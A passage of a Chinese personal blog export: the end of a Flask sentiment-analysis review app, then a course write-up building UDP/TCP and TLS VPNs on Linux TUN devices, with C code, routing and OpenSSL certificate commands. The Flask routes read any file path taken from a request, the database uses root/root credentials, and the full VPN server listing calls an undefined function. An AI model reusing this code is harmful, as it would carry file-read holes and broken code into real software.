160) ].join(&#x27;,&#x27;) + &#x27;)&#x27;; &#125; &#125;, emphasis: &#123; shadowBlur: 10, shadowColor: &#x27;#333&#x27; &#125; &#125;, data: res.data, &#125;] &#125;); 评论检测当用户输入检测文本，系统会调用训练好的模型对文本进行情感分析，并将得到的结果写入数据库，之后在页面中显示 python代码 @app.route(&#x27;/data1&#x27;,methods=[&#x27;GET&#x27;]) def data1(): path = str(request.args[&#x27;path&#x27;]) data = [] if(len(path)==0): table_result = &#123;&quot;code&quot;: 0, &quot;msg&quot;: None, &quot;count&quot;: 0, &quot;data&quot;: data&#125; else: with open(path, &#x27;r&#x27;, encoding=&#x27;UTF-8&#x27;) as f: reader = f.readlines() rows = [row for row in reader] for i in rows: result = analyzer.analyze(i) // 调用已经封装好的模型对提交的文本进行检测，返回结果 d = &#123;&quot;content&quot;:i,&quot;result&quot;:result&#125; data.append(d) table_result = &#123;&quot;code&quot;: 0, &quot;msg&quot;: None, &quot;count&quot;: 10, &quot;data&quot;: data&#125; return jsonify(table_result) @app.route(&#x27;/ksh&#x27;,methods=[&#x27;GET&#x27;]) def ksh(): path = str(request.args[&#x27;path&#x27;]) good = 0 bad = 0 if(len(path)==0): table_result = &#123;&quot;code&quot;: 0, &quot;msg&quot;: None, &quot;count&quot;: 0, &quot;data&quot;: data&#125; else: with open(path, &#x27;r&#x27;, encoding=&#x27;UTF-8&#x27;) as f: reader = f.readlines() rows = [row for row in reader] for i in rows: result = analyzer.analyze(i) if(result == &quot;好评&quot;): good+=1 else: bad+=1 table_result = &#123;&quot;good&quot;: good, &quot;bad&quot;: bad&#125; return jsonify(table_result) js脚本 var insTb = table.render(&#123; elem: &#x27;#tableUser&#x27;, url: &#x27;http://127.0.0.1:5000/data&#x27;, height: &#x27;full-250&#x27;, page: true, toolbar: true, cellMinWidth: 100, cols: [ [&#123; type: &#x27;numbers&#x27;, title: &#x27;#&#x27; &#125;, &#123; field: &#x27;content&#x27;, sort: true, title: &#x27;内容&#x27; &#125;, &#123; field: &#x27;type&#x27;, sort: true, title: &#x27;分类&#x27;, width:200, templet: function(d)&#123; if(d.TYPE == 1)&#123; return &#x27;好评&#x27; &#125;else&#123; return &#x27;差评&#x27; &#125; &#125; &#125; ] ] &#125;); 批量检测批量检测是将多条评论写入txt文件中，实现一次检测多条评论，然后将数据显示在页面中，并呈现可视化结果 @app.route(&#x27;/data&#x27;,methods=[&#x27;GET&#x27;]) def data(): limit = int(request.args[&#x27;limit&#x27;]) page = int(request.args[&#x27;page&#x27;]) page = (page-1)*limit conn = pymysql.connect(host=&#x27;127.0.0.1&#x27;, user=&#x27;root&#x27;, password=&#x27;root&#x27;, port=3306, db=&#x27;goods&#x27;, charset=&#x27;utf8mb4&#x27;) cursor = conn.cursor() cursor.execute(&quot;select count(*) from `result`&quot;); count = cursor.fetchall() cursor = conn.cursor(cursor=pymysql.cursors.DictCursor) cursor.execute(&quot;select * from `result` limit &quot;+str(page)+&quot;,&quot;+str(limit)); data_dict = [] result = cursor.fetchall() for field in result: data_dict.append(field) table_result = &#123;&quot;code&quot;: 0, &quot;msg&quot;: None, &quot;count&quot;: count[0], &quot;data&quot;: data_dict&#125; cursor.close() conn.close() return jsonify(table_result) js脚本 upload.render(&#123; //允许上传的文件后缀 elem: &#x27;#test_upload&#x27;, url: &#x27;http://127.0.0.1:5000/upload&#x27;, field: &#x27;myfile&#x27;, accept: &#x27;file&#x27;, //普通文件 exts: &#x27;txt&#x27;, //只允许上传txt文件 before: function(obj) &#123; //obj参数包含的信息，跟 choose回调完全一致，可参见上文。 layer.load(); //上传loading &#125;, done: function(res) &#123; layer.closeAll(&#x27;loading&#x27;); layer.msg(&#x27;上传成功&#x27;); console.log(res) path = res.path insTb.reload(&#123; where: &#123; &#x27;path&#x27;: path &#125; &#125;); $.ajax(&#123; type: &#x27;GET&#x27;, url: &#x27;http://127.0.0.1:5000/ksh&#x27;, data: &#123; &#x27;path&#x27;: path &#125;, success: function(result) &#123; var option = &#123; tooltip: &#123; trigger: &#x27;item&#x27;, formatter: &#x27;&#123;a&#125; &lt;br/&gt;&#123;b&#125; : &#123;c&#125; (&#123;d&#125;%)&#x27; &#125;, legend: &#123; orient: &#x27;vertical&#x27;, left: &#x27;left&#x27;, data: [&#x27;有效评论&#x27;, &#x27;垃圾评论&#x27;] &#125;, series: [&#123; name: &#x27;评论比例&#x27;, type: &#x27;pie&#x27;, radius: &#x27;55%&#x27;, center: [&#x27;50%&#x27;, &#x27;60%&#x27;], data: [&#123; value: result.good, name: &#x27;有效评论&#x27; &#125;, &#123; value: result.bad, name: &#x27;垃圾评论&#x27; &#125; ], emphasis: &#123; itemStyle: &#123; shadowBlur: 10, shadowOffsetX: 0, shadowColor: &#x27;rgba(0, 0, 0, 0.5)&#x27; &#125; &#125; &#125;] &#125;; myCharts.setOption(option) &#125; &#125;); 最后呈现的效果 参考： https://github.com/NTDXYG/ProjectsForChineseGraduates","tags":[{"name":"朴素贝叶斯","slug":"朴素贝叶斯","permalink":"https://sunzhengyu99.github.io/tags/%E6%9C%B4%E7%B4%A0%E8%B4%9D%E5%8F%B6%E6%96%AF/"}]},{"title":"VPN","date":"2021-07-21T08:04:57.000Z","path":"2021/07/21/VPN/","text":"操作系统大作业 一、基于UDP/TCP的VPN实现原理 tun 接口 VPN搭建 隧道转发数据包 tun 设备简介tun(/tap) 是 Linux 内核 2.4.x 版本之后实现的虚拟网络设备，不同于物理网卡靠硬件网卡实现，tap/tun 虚拟网卡完全由软件来实现，功能和硬件实现完全没有差别，它们都属于网络设备，都可以配置 IP，都归 Linux 网络设备管理模块统一管理。 TUN 工作机制TUN 设备是一种虚拟网络设备，通过此设备，程序可以方便得模拟网络行为。其工作方式如图 Linux Tun/Tap驱动程序为应用程序提供了两种交互方式：虚拟网络接口和字符设备/dev/net/tun。写入字符设备/dev/net/tun的数据会发送到虚拟网络接口中；发送到虚拟网络接口中的数据也会出现在该字符设备上。 应用程序可以通过标准的Socket API向Tun/Tap接口发送IP数据包，就好像对一个真实的网卡进行操作一样。除了应用程序以外，操作系统也会根据TCP/IP协议栈的处理向Tun/Tap接口发送IP数据包或者以太网数据包，例如ARP或者ICMP数据包。Tun/Tap驱动程序会将Tun/Tap接口收到的数据包原样写入到/dev/net/tun字符设备上，处理Tun/Tap数据的应用程序如VPN程序可以从该设备上读取到数据包，以进行相应处理。 应用程序也可以通过/dev/net/tun字符设备写入数据包，这种情况下该字符设备上写入的数据包会被发送到Tun/Tap虚拟接口上，进入操作系统的TCP/IP协议栈进行相应处理，就像从物理网卡进入操作系统的数据一样。 搭建 VPN其工作流程为： 通过程序可以从/dev/net/tun字符设备中读取(read)或者写入(write)数据，再通过将Tun结合物理网络设备使用,我们可以创建一个点对点的隧道。如下图所示，左边主机上应用程序发送到Tun虚拟设备上的IP数据包被VPN程序通过字符设备接收，然后再通过一个UDP隧道发送到右端的VPN服务器上，VPN服务器将隧道负载中的原始IP数据包写入字符设备，这些IP包就会出现在右侧的Tun虚拟设备上，最后通过操作系统协议栈和socket接口发送到右侧的应用程序上。 通过隧道发送/接收包 当隧道建立后，如何通过隧道发送/接收数据包是需要解决的问题 通过隧道发送 通过TUN接口获得一个IP包—&gt;加密（或者验证)—&gt;把它作为载荷发送到隧道另一端 通过隧道接收 通过隧道接收载荷—&gt;解密并验证数据—&gt;获得真实的包数据—&gt;把包数据写到TUN接口。 如下图所示 监听socket和tun0网卡，然后转发数据包 每一个隧道应用都有两种接口: socket接口、TUN接口，两种接口都需要监听，需要在两种接口间转发数据。 程序实现在编写程序之前需要做一些准备，程序流程图如下 从图中可知程序中主要包含四个部分 创建tun0网卡 客户端和服务器socket连接 转发来自tunnel和tun0数据 主程序，监听接口阻塞进程 vpnclient 和 vpnserver 程序是 VPN 隧道的两端。它们通过套接字使用 UDP 相互通信。客户端和服务器之间的虚线描绘了 VPN 隧道的路径。 VPN 客户端和服务器程序通过 TUN 接口连接到主机系统，通过它他们做两件事： （1）从主机系统获取 IP 数据包，因此数据包可以通过隧道发送 （2）从隧道获取 IP 数据包，然后将其转发到托管系统，该系统会将数据包转发到其最终目的地。 创建tun网卡在上图中可以看到客户端和服务器都需要一个tun网卡，所以需要在两台主机上都创建一个tun0网卡，从而形成tunnel，实现通信 使用命令创建tun网卡 ip tuntap add dev tun0 mode tun 当上面的命令执行完再使用ifconfig -a就可以看到刚刚创建的tun0网卡，再使用如下的命令对其配置 ifconfig tun0 192.168.53.5/24 up 但是这里为了程序执行方便，直接在程序中创建虚拟网卡 int createTunDevice() &#123; // 创建 tun0 网卡 int tunfd; struct ifreq ifr; memset(&amp;ifr, 0, sizeof(ifr)); ifr.ifr_flags = IFF_TUN | IFF_NO_PI; // tun设备不包含以太网头部 tunfd = open(&quot;/dev/net/tun&quot;, O_RDWR); // 打开文件 ioctl(tunfd, TUNSETIFF, &amp;ifr); // 打开设备 return tunfd; // 该函数执行完后 执行命令ifconfig tunX 192.168.53.5/24 up 为tun网卡设置IP并开启 &#125; socket连接VPN server UDP连接int initUDPServer() &#123; int sockfd; struct sockaddr_in server; char buff[100]; memset(&amp;server, 0, sizeof(server)); server.sin_family = AF_INET; // 服务器地址类型为IPV4 server.sin_addr.s_addr = htonl(INADDR_ANY); //服务器IP server.sin_port = htons(PORT_NUMBER); // 端口号 sockfd = socket(AF_INET, SOCK_DGRAM, 0); //创建UDP的套接字 bind(sockfd, (struct sockaddr*) &amp;server, sizeof(server)); // socket绑定地址和端口 // 等待连接 bzero(buff, 100); //清空缓冲区 int peerAddrLen = sizeof(struct sockaddr_in); //初始化结构体 int len = recvfrom(sockfd, buff, 100, 0,(struct sockaddr *) &amp;peerAddr, &amp;peerAddrLen); // 等待接收数据 printf(&quot;Connected with the client: %s\\n&quot;, buff); return sockfd; &#125; VPN client int connectToUDPServer()&#123; //创建socket连接 连接到vpn服务器 int sockfd; char *hello=&quot;Hello&quot;; //指定服务器的地址结构 memset(&amp;peerAddr, 0, sizeof(peerAddr)); peerAddr.sin_family = AF_INET; // 服务器地址类型为IPV4 peerAddr.sin_port = htons(PORT_NUMBER); peerAddr.sin_addr.s_addr = inet_addr(SERVER_IP); sockfd = socket(AF_INET, SOCK_DGRAM, 0); sendto(sockfd, hello, strlen(hello), 0, // 连接服务器后发送一个消息 hello (struct sockaddr *) &amp;peerAddr, sizeof(peerAddr)); return sockfd; &#125; TCP连接VPN server int initTCPServer() &#123; struct sockaddr_in sa_server; int listen_sock; listen_sock= socket(PF_INET, SOCK_STREAM, IPPROTO_TCP); CHK_ERR(listen_sock, &quot;socket&quot;); memset (&amp;sa_server, &#x27;\\0&#x27;, sizeof(sa_server)); sa_server.sin_family = AF_INET; sa_server.sin_addr.s_addr = INADDR_ANY; sa_server.sin_port = htons (4433); int err = bind(listen_sock, (struct sockaddr*)&amp;sa_server, sizeof(sa_server)); CHK_ERR(err, &quot;bind&quot;); err = listen(listen_sock, 5); CHK_ERR(err, &quot;listen&quot;); return listen_sock; &#125; VPN client int initTCPClient(const char* hostname, int port) &#123; struct sockaddr_in server_addr; struct hostent* hp = gethostbyname(hostname); // 创建TCP socket int sockfd= socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); // 填写ip 端口 和协议信息 memset (&amp;server_addr, &#x27;\\0&#x27;, sizeof(server_addr)); memcpy(&amp;(server_addr.sin_addr.s_addr), hp-&gt;h_addr, hp-&gt;h_length); server_addr.sin_port = htons (port); server_addr.sin_family = AF_INET; // 连接目的地址 connect(sockfd, (struct sockaddr*) &amp;server_addr, sizeof(server_addr)); return sockfd; &#125; 转发端口数据客户端程序和服务器端程序都需要以下两个库函数 int sendto(int s, const void * msg, int len, unsigned int flags, const struct sockaddr * to, int tolen); 函数说明：sendto() 用来将数据由指定的socket 传给对方主机. 参数s 为已建好连线的socket, 如果利用UDP协议则不需经过连线操作. 参数msg 指向欲连线的数据内容, 参数flags 一般设0, 参数to 用来指定欲传送的网络地址, 结构sockaddr 请参考bind(). 参数tolen 为sockaddr 的结果长度. int recvfrom(int s, void *buf, int len, unsigned int flags, struct sockaddr *from,int *fromlen); 函数说明：recv()用来接收远程主机经指定的socket 传来的数据, 并把数据存到由参数buf 指向的内存空间, 参数len 为可接收数据的最大长度. 参数flags 一般设0, 参数from 用来指定欲传送的网络地址, 结构sockaddr 请参考bind(). 参数fromlen 为sockaddr 的结构长度. 从tun0接收数据转发到tunnel void tunSelected(int tunfd, int sockfd)&#123; int len; char buff[BUFF_SIZE]; //定义接收数的缓冲区 printf(&quot;Got a packet from TUN\\n&quot;); bzero(buff, BUFF_SIZE); // 清空缓冲区 len = read(tunfd, buff, BUFF_SIZE); // 读取来自tun0网卡的数据，保存在缓冲区中 sendto(sockfd, buff, len, 0, (struct sockaddr *) &amp;peerAddr, sizeof(peerAddr)); // 通过socket发送数据 &#125; 从tunnel接收数据转发到tun0 void socketSelected (int tunfd, int sockfd)&#123; int len; char buff[BUFF_SIZE]; printf(&quot;Got a packet from the tunnel\\n&quot;); bzero(buff, BUFF_SIZE); len = recvfrom(sockfd, buff, BUFF_SIZE, 0, NULL, NULL); // 接收数据至buff，保存数据的长度 write(tunfd, buff, len); // 通过write发送到tun0 &#125; 主函数主要作用，调用之前的函数，创建tun0网卡；建立基于udp的socket连接；循环接收数据 用到的库函数 int select(int n, fd_set * readfds, fd_set * writefds, fd_set * exceptfds, struct timeval * timeout); 函数说明：select()用来等待文件描述词状态的改变，会阻塞进程. 参数n 代表最大的文件描述词加1, 参数readfds、writefds 和exceptfds 称为描述词组, 是用来回传该描述词的读, 写或例外的状况. 底下的宏提供了处理这三种描述词组的方式： FD_CLR(inr fd, fd_set* set); 用来清除描述词组set 中相关fd 的位 FD_ISSET(int fd, fd_set * set); 用来测试描述词组set 中相关fd 的位是否为真 FD_SET(int fd, fd_set* set); 用来设置描述词组set 中相关fd 的位 FD_ZERO(fd_set * set); 用来清除描述词组set 的全部位 FD_ISSET 检测fd在fdset集合中的状态是否变化，当检测到fd状态发生变化时返回真，否则，返回假（也可以认为集合中指定的文件描述符是否可以读写）。 fd_set 可以理解为一个集合，这个集合中存放的是文件描述符(file descriptor)，即文件句柄，它用一位来表示一个fd（下面会仔细介绍） int main (int argc, char * argv[]) &#123; int tunfd, sockfd; tunfd = createTunDevice(); // 创建tun0网卡 sockfd = connectToUDPServer(); // 建立socket连接 // 进入主循环 while (1) &#123; fd_set readFDSet; FD_ZERO(&amp;readFDSet); // 将set清零使集合中不含任何fd FD_SET(sockfd, &amp;readFDSet); // 将socketfd加入set集合 FD_SET(tunfd, &amp;readFDSet); // 将tunfd加入set集合 select(FD_SETSIZE, &amp;readFDSet, NULL, NULL, NULL); // 监听两个端口 阻塞进程，知道有一个端口收到数据 // 当收到数据程序继续执行 对数据进行转发 if (FD_ISSET(tunfd, &amp;readFDSet)) // 当tun的文件fd可以读写 tunSelected(tunfd, sockfd); if (FD_ISSET(sockfd, &amp;readFDSet)) // 当socket的文件fd可以读写 socketSelected(tunfd, sockfd); &#125; &#125; 完整代码VPN server #include &lt;fcntl.h&gt; #include &lt;stdio.h&gt; #include &lt;unistd.h&gt; #include &lt;string.h&gt; #include &lt;arpa/inet.h&gt; #include &lt;linux/if.h&gt; #include &lt;linux/if_tun.h&gt; #include &lt;sys/ioctl.h&gt; #define PORT_NUMBER 55555 #define BUFF_SIZE 2000 struct sockaddr_in peerAddr; int createTunDevice() &#123; // 创建 tun0 网卡 int tunfd; struct ifreq ifr; memset(&amp;ifr, 0, sizeof(ifr)); ifr.ifr_flags = IFF_TUN | IFF_NO_PI; // tun设备不包含以太网头部 tunfd = open(&quot;/dev/net/tun&quot;, O_RDWR); // 打开文件 ioctl(tunfd, TUNSETIFF, &amp;ifr); // 打开设备 return tunfd; // 该函数执行完后 执行命令ifconfig tunX 192.168.53.5/24 up 为tun网卡设置IP并开启 &#125; int initUDPServer() &#123; int sockfd; struct sockaddr_in server; char buff[100]; memset(&amp;server, 0, sizeof(server)); server.sin_family = AF_INET; // 服务器地址类型为IPV4 server.sin_addr.s_addr = htonl(INADDR_ANY); //服务器IP server.sin_port = htons(PORT_NUMBER); // 端口号 sockfd = socket(AF_INET, SOCK_DGRAM, 0); //创建UDP的套接字 bind(sockfd, (struct sockaddr*) &amp;server, sizeof(server)); // socket绑定地址和端口 // 等待连接 bzero(buff, 100); //清空缓冲区 int peerAddrLen = sizeof(struct sockaddr_in); //初始化结构体 int len = recvfrom(sockfd, buff, 100, 0,(struct sockaddr *) &amp;peerAddr, &amp;peerAddrLen); // 等待接收数据 printf(&quot;Connected with the client: %s\\n&quot;, buff); return sockfd; &#125; void tunSelected(int tunfd, int sockfd)&#123; int len; char buff[BUFF_SIZE]; //定义接收数的缓冲区 printf(&quot;Got a packet from TUN\\n&quot;); bzero(buff, BUFF_SIZE); // 清空缓冲区 len = read(tunfd, buff, BUFF_SIZE); // 读取来自tun0网卡的数据，保存在缓冲区中 sendto(sockfd, buff, len, 0, (struct sockaddr *) &amp;peerAddr, sizeof(peerAddr)); // 通过socket发送数据 &#125; void socketSelected (int tunfd, int sockfd)&#123; int len; char buff[BUFF_SIZE]; printf(&quot;Got a packet from the tunnel\\n&quot;); bzero(buff, BUFF_SIZE); len = recvfrom(sockfd, buff, BUFF_SIZE, 0, NULL, NULL); // 接收数据至buff，保存数据的长度 write(tunfd, buff, len); // 通过write发送到tun0 &#125; int main (int argc, char * argv[]) &#123; int tunfd, sockfd; tunfd = createTunDevice(); // 创建tun0网卡 sockfd = connectToUDPServer(); // 建立socket连接 // 进入主循环 while (1) &#123; fd_set readFDSet; FD_ZERO(&amp;readFDSet); // 将set清零使集合中不含任何fd FD_SET(sockfd, &amp;readFDSet); // 将socketfd加入set集合 FD_SET(tunfd, &amp;readFDSet); // 将tunfd加入set集合 select(FD_SETSIZE, &amp;readFDSet, NULL, NULL, NULL); // 监听两个端口 阻塞进程，知道有一个端口收到数据 // 当收到数据程序继续执行 对数据进行转发 if (FD_ISSET(tunfd, &amp;readFDSet)) // 当tun的文件fd可以读写 tunSelected(tunfd, sockfd); if (FD_ISSET(sockfd, &amp;readFDSet)) // 当socket的文件fd可以读写 socketSelected(tunfd, sockfd); &#125; &#125; VPN client #include &lt;fcntl.h&gt; #include &lt;stdio.h&gt; #include &lt;unistd.h&gt; #include &lt;string.h&gt; #include &lt;arpa/inet.h&gt; #include &lt;linux/if.h&gt; #include &lt;linux/if_tun.h&gt; #include &lt;sys/ioctl.h&gt; #define BUFF_SIZE 2000 #define PORT_NUMBER 55555 #define SERVER_IP &quot;10.0.2.8&quot; // VPN 服务器ip struct sockaddr_in peerAddr; int createTunDevice() &#123; // 创建 tun0 网卡 int tunfd; struct ifreq ifr; memset(&amp;ifr, 0, sizeof(ifr)); ifr.ifr_flags = IFF_TUN | IFF_NO_PI; // tun设备不包含以太网头部 tunfd = open(&quot;/dev/net/tun&quot;, O_RDWR); // 打开文件 ioctl(tunfd, TUNSETIFF, &amp;ifr); // 打开设备 return tunfd; // 该函数执行完后 执行命令ifconfig tunX 192.168.53.5/24 up 为tun网卡设置IP并开启 &#125; int connectToUDPServer()&#123; //创建socket连接 连接到vpn服务器 int sockfd; char *hello=&quot;Hello&quot;; //指定服务器的地址结构 memset(&amp;peerAddr, 0, sizeof(peerAddr)); peerAddr.sin_family = AF_INET; // 服务器地址类型为IPV4 peerAddr.sin_port = htons(PORT_NUMBER); peerAddr.sin_addr.s_addr = inet_addr(SERVER_IP); sockfd = socket(AF_INET, SOCK_DGRAM, 0); sendto(sockfd, hello, strlen(hello), 0, // 连接服务器后发送一个消息 hello (struct sockaddr *) &amp;peerAddr, sizeof(peerAddr)); return sockfd; &#125; void tunSelected(int tunfd, int sockfd)&#123; int len; char buff[BUFF_SIZE]; //定义接收数的缓冲区 printf(&quot;Got a packet from TUN\\n&quot;); bzero(buff, BUFF_SIZE); // 清空缓冲区 len = read(tunfd, buff, BUFF_SIZE); // 读取来自tun0网卡的数据，保存在缓冲区中 sendto(sockfd, buff, len, 0, (struct sockaddr *) &amp;peerAddr, sizeof(peerAddr)); // 通过socket发送数据 &#125; void socketSelected (int tunfd, int sockfd)&#123; int len; char buff[BUFF_SIZE]; printf(&quot;Got a packet from the tunnel\\n&quot;); bzero(buff, BUFF_SIZE); len = recvfrom(sockfd, buff, BUFF_SIZE, 0, NULL, NULL); // 接收数据至buff，保存数据的长度 write(tunfd, buff, len); // 通过write发送到tun0 &#125; int main (int argc, char * argv[]) &#123; int tunfd, sockfd; tunfd = createTunDevice(); // 创建tun0网卡 sockfd = connectToUDPServer(); // 建立socket连接 // 进入主循环 while (1) &#123; fd_set readFDSet; FD_ZERO(&amp;readFDSet); // 将set清零使集合中不含任何fd FD_SET(sockfd, &amp;readFDSet); // 将socketfd加入set集合 FD_SET(tunfd, &amp;readFDSet); // 将tunfd加入set集合 select(FD_SETSIZE, &amp;readFDSet, NULL, NULL, NULL); // 监听两个端口 阻塞进程，知道有一个端口收到数据 // 当收到数据程序继续执行 对数据进行转发 if (FD_ISSET(tunfd, &amp;readFDSet)) // 当tun的文件fd可以读写 tunSelected(tunfd, sockfd); if (FD_ISSET(sockfd, &amp;readFDSet)) // 当socket的文件fd可以读写 socketSelected(tunfd, sockfd); &#125; &#125; 实验环境 实验装置 拓扑图 主机物理网卡配置 实验装置 host u：ubuntu 18.04 VPNserver：ubuntu 18.04 host V：ubuntu 18.04 网络拓扑图 本次实验需要三台主机，分别作为host U(VPN 用户)，VPN服务, host V(内网主机)。 host V处于192.168.60.0/24网段，属于内网。 host U处于10.0.2.0/24网段，属于外网，host V 和 host U在没有VPN的情况下无法通信。 VPN server有两张网卡，一张网卡的IP地址为192.168.60.1处于192.168.60.0/24网段，作为host V的网关，并可以与其通信；而另一张网卡地址为10.0.2.8属于外网网段，可以与host U通信，同时其作为host U的VPN服务器，实现与host V通信。 主机物理网卡配置 主机 角色 IP地址 客户机 VPN客户机/host U 10.0.2.7/24 服务器 VPN服务器/网关 10.0.2.8/24192.168.60.1/24 内网主机 host V 192.168.60.101/24 tun0 虚拟网卡配置 主机 虚拟接口 IP地址 服务器 tun0 192.168.53.1/24 客户机 tun0 192.168.53.5/24 环境搭建运行了三台ubuntu的虚拟机，关系如上面描述 服务器主机服务器主机需要两块网卡，这里通过VM再添加一块网卡即可，配置如图 运行vpnserver程序，运行后会出现一个tun0网卡 使用命令配置tun0 ifconfig tun0 192.168.53.1/24 up 由于 VPN Server 需要在私网和隧道之间转发数据包，因此它也需要充当网关，这是通过在 VPN Server 上启用 IP 转发来实现的。 sysctl net.ipv4.ip_forward=1 host v客户端运行./vpnclient，之后会出现一个tun0接口，然后对其配置 ifconfig tun0 192.168.53.5/24 up 配置路由经过以上两步，隧道就建立起来了，然后我们设置路由路径以将预期流量引导到客户端和服务器机器上的隧道。在 host v上，我们将所有进入专用网络 (192.168.60.0/24) 的数据包定向到 tun0 接口，数据包将从该接口通过 VPN 隧道转发。我们使用 route 命令在 host v 上添加以下路由条目： route add -net 192.168.60.0/24 tun0 在服务器主机上，将流向 192.168.53.0/24 网络的流量定向到 tun0 接口 内网主机上为了通过 VPN 隧道将 Host V （内网主机）回复发送到 Host U，我们在 Host V 上添加了一个路由条目，它将去往 Host U 网络的数据包路由到 VPN Serve。从 VPN Server，这个数据包将通过 VPN 隧道到达 VPN Client，最终到达 Host U。 下面显示了 Host V 上的路由条目 route add -net 192.168.53.0/24 gw 192.168.60.1 ens33 验证通信ping 测试cliet ping 内网主机 内网主机ping client 内网主机追踪路由，可以看到经过网关192.168.60.1到达了目的地址 查看vpnclient和vpnserver程序的运行情况 VPN client 在发送 ping 请求时，vpnclient反映已收到 TUN 接口上的数据包（ping 请求）并连续收到隧道中的包（ping 回复） VPN server 在 vpnserver上，程序反映从隧道接收数据包（ping 请求），然后从 TUN 接收数据包（ping 回复） ssh测试在host V执行 ssh root@192.168.60.101 在 host U上执行 ssh root@10.0.2.7 通过上面的测试可以确定两台主机可以通过VPN程序进行远程控制。 二、TSL VPN有了上面基于TCP的VPN，再做TSL就会简单很多。 程序实现ssl初始化创建SSL数据结构，用于建立TLS连接 VPN server SSL* SSLLibInit() &#123; SSL_METHOD *meth; SSL_CTX* ctx; SSL *ssl; int err; // OpenSSL 初始化 SSL_library_init(); SSL_load_error_strings(); SSLeay_add_ssl_algorithms(); // SSL 初始化 meth = (SSL_METHOD *)TLSv1_2_method(); ctx = SSL_CTX_new(meth); SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, NULL); // 加载服务器证书和私钥文件 SSL_CTX_use_certificate_file(ctx, &quot;./cert_server/server.pem&quot;, SSL_FILETYPE_PEM); SSL_CTX_use_PrivateKey_file(ctx, &quot;./cert_server/server-key.pem&quot;, SSL_FILETYPE_PEM); ssl = SSL_new (ctx); return ssl; &#125; VPN client SSL* setupTLSClient(const char* hostname) &#123; // OpenSSL 初始化 SSL_library_init(); SSL_load_error_strings(); SSLeay_add_ssl_algorithms(); SSL_METHOD *meth; SSL_CTX* ctx; SSL* ssl; meth = (SSL_METHOD *)TLSv1_2_method(); ctx = SSL_CTX_new(meth); SSL_CTX_set_verify(ctx, SSL_VERIFY_PEER, verify_callback); //指明是否要求提供证书 if (SSL_CTX_load_verify_locations(ctx,NULL, CA_DIR) &lt; 1) &#123; //加载可信CA证书，进行证书验证 printf(&quot;Error setting the verify locations. \\n&quot;); exit(0); &#125; ssl = SSL_new (ctx); X509_VERIFY_PARAM *vpm = SSL_get0_param(ssl); X509_VERIFY_PARAM_set1_host(vpm, hostname, 0); return ssl; &#125; TCP连接TCP连接与上面的连接一样。 TLS握手 SSL_set_fd()将SSL绑定到一个TCP连接调用SSL_connec()启动与服务器的TLS握手协议) /*----------------TLS initialization ----------------*/ ssl = setupTLSClient(hostname); printf(&quot;TLSClientsetup initialisation is successful\\n&quot;); /*----------------Create a TCP connection ---------------*/ int sockfd = setupTCPClient(hostname, port); printf(&quot;TCPClientsetup is successful\\n&quot;); /*----------------TLS handshake ---------------------*/ SSL_set_fd(ssl, sockfd); //绑定TCP连接 printf(&quot;SSL_set_fd() is successful\\n&quot;); int err = SSL_connect(ssl); CHK_SSL(err); printf(&quot;SSL connection is successful\\n&quot;); printf(&quot;SSL connection using %s\\n&quot;, SSL_get_cipher(ssl)); 数据转发数据转发的原理与基于UDP/TCP的VPN 的原理 void processRequest(int tunfd, SSL* ssl, int sockfd) &#123; while(1) &#123; fd_set readFDSet; FD_ZERO(&amp;readFDSet); FD_SET(sockfd, &amp;readFDSet); FD_SET(tunfd, &amp;readFDSet); select(FD_SETSIZE, &amp;readFDSet, NULL, NULL, NULL); if (FD_ISSET(tunfd, &amp;readFDSet)) tunSelected(tunfd, sockfd, ssl); if (FD_ISSET(sockfd, &amp;readFDSet)) socketSelected(tunfd, sockfd, ssl); &#125; &#125; 实验环境由于在上ubuntu 18.04上运行时，程序出现错误，所以使用了seedLab 提供的 ubuntu 16.04重新搭建了实验环境。各个网卡信息与上面的实验一样。 host U：ubuntu 16.04 VPNserver：ubuntu 16.04 host V：ubuntu 16.04 主机物理网卡配置 主机 角色 IP地址 客户机 VPN客户机/host U 10.0.2.7/24 服务器 VPN服务器/网关 10.0.2.8/24192.168.60.1/24 内网主机 host V 192.168.60.101/24 连通性测试配置完各个网卡的IP地址后 host U 可以 ping 通 VPNserver (10.0.2.0/24) VPN server 可以ping 通两台主机 host V可以ping 通VPNserver (192.168.60.0/24) CA和证书设置(1)、为 CA 生成一个自签名证书，它将作为根证书，如下所示： openssl req -new -x509 -keyout ca.key -out ca.crt -config openssl.cnf //文件 ca.key 包含 CA 的私钥，而 ca.crt 包含公钥证书。 (2)、接下来，我们使用以下命令为服务器创建一个 RSA 公私钥对 openssl genrsa -aes128 -out server.key 1024 (3)、创建一个包含服务器公钥的证书签名请求 (CSR)。 CSR 具有以下详细信息，服务器的通用名称为 sunzy.com： openssl req -new -key server.key -out server.csr -config openssl.cnf (4)、然后将上述 CSR 发送到 CA 以生成密钥和通用名称的证书。 openssl x509 -req -days 365 -in server.csr -signkey server.key -out server.crt (5)、将服务器的证书和密钥存储为 pem 文件，这里是 cp server.crt server-cert.pem cp server.key server-key.pem VPN Server 程序使用这些文件来加载证书和私钥，如下所示 (6)、使用名称作为主题字段的哈希存储服务器的证书。这是因为在接收服务器的证书时，TLS 会根据颁发者的身份信息生成一个哈希值，并使用此哈希值在“./cert”文件夹中查找颁发者的证书，命令如下:(以下命令在ca_client 文件下执行) openssl x509 -in ca.crt -noout -subject_hash ln -s ca.crt b4386d70.0 建立TLS通信VPN server首先在VPN服务器上执行以下命令，将c程序编译为可执行程序 gcc -o vpnserver_tls vpnserver_tls.c -lssl -lcrypto -lcrypt 执行编译好的程序，此时该程序处于监听状态等待客户端的连接 此时该程序将创建一个tun0虚拟网卡，使用以下命令配置网卡信息 sudo ifconfig tun0 192.168.53.1/24 up 配置完后的网卡信息如图： 编辑路由表并将设置为转发模式 sudo route add –net 192.168.53.0/24 tun0 sudo sysctl net.ipv4.ip_forward=1 VPN client与服务器上一样，首先编译c程序 gcc -o vpnclient_tls vpnclient_tls.c -lssl -lcrypto 执行该程序（该域名与上面创建的证书中的通用名称一样） sudo ./vpnclient_tls &quot;sunzy.com&quot; 4433 创建连接后，服务器端确认后，开始身份认证 服务器端收到的消息如下 此时TLS连接已经建立。 配置tun0和路由表 sudo ifconfig tun0 192.168.53.5/24 up sudo route add -net 192.168.60.0/24 Host V要实现内外网主机之间的通信，还需要在内网主机上添加路由表信息 sudo route add -net 192.168.53.0/24 gw 192.168.60.1 enp0s3 VPN server和VPN client 的连接信息VPN server VPN client 通信验证ping 测试 客户端（10.0.2.7）ping 内网主机（192.168.60.101） 内网主机(192.168.60.101) ping 10.0.2.7 